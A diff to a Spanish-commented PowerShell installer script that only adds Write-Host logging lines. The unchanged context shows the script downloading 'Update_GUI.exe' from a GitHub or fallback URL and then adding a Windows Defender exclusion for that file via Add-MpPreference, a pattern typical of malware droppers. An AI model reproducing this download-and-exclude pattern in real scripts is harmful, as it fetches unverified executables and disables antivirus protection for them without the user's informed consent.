@@ -31,6 +31,7 @@ if ([Environment]::Is64BitOperatingSystem) {
 $finalName = "Update_GUI.exe"
 
 Write-Output "Sistema detectado: $arch"
+Write-Host "Sistema detectado: $arch"
 
 # ================= RUTAS =================
 $tempPath  = Join-Path -Path $env:USERPROFILE -ChildPath $fileName
@@ -48,33 +49,40 @@ function Download-File($url, $output) {
 
 # ================= DESCARGA DEL PROGRAMA =================
 Write-Output "Intentando descargar desde GitHub: $primaryUrl"
+Write-Host "Intentando descargar desde GitHub: $primaryUrl"
 
 $downloaded = Download-File $primaryUrl $tempPath
 if (-not $downloaded) {
     Write-Warning "Fallo descarga desde GitHub, intentando fallback: $fallbackUrl"
+    Write-Host "Fallo descarga desde GitHub, intentando fallback: $fallbackUrl"
     $downloaded = Download-File $fallbackUrl $tempPath
     if (-not $downloaded) {
         Write-Error "Error descargando desde GitHub y fallback: $primaryUrl / $fallbackUrl"
+        Write-Host "Error descargando desde GitHub y fallback: $primaryUrl / $fallbackUrl"
         exit 1
     }
 } else {
     Write-Output "Descargado desde GitHub: $primaryUrl"
+    Write-Host "Descargado desde GitHub: $primaryUrl"
 }
 
 # ================= VALIDACIÓN DESCARGA =================
 if (-not (Test-Path $tempPath)) {
     Write-Error "El archivo no existe después de la descarga"
+    Write-Host "El archivo no existe después de la descarga"
     exit 1
 }
 
 $fileSize = (Get-Item $tempPath).Length
 if ($fileSize -lt 500000) {
     Write-Error "Archivo descargado sospechosamente pequeño"
+    Write-Host "Archivo descargado sospechosamente pequeño"
     exit 1
 }
 
 # ================= RENOMBRAR =================
 Write-Output "Renombrando a $finalName..."
+Write-Host "Renombrando a $finalName..."
 
 try {
     if (Test-Path $finalPath) {
@@ -83,17 +91,21 @@ try {
     Rename-Item -Path $tempPath -NewName $finalName
 } catch {
     Write-Error "Error renombrando el archivo"
+    Write-Host "Error renombrando el archivo"
     exit 1
 }
 
 Write-Output "Archivo final: $finalPath"
+Write-Host "Archivo final: $finalPath"
 
 # ================= EXCEPCIÓN DEFENDER =================
 try {
     Add-MpPreference -ExclusionPath $finalPath
     Write-Output "Excepción de Windows Defender añadida"
+    Write-Host "Excepción de Windows Defender añadida"
 } catch {
     Write-Warning "No se pudo agregar la exclusión"
+    Write-Host "No se pudo agregar la exclusión"
 }
 
 # ================= VERIFICAR E INSTALAR .NET 8.0 DESKTOP RUNTIME =================
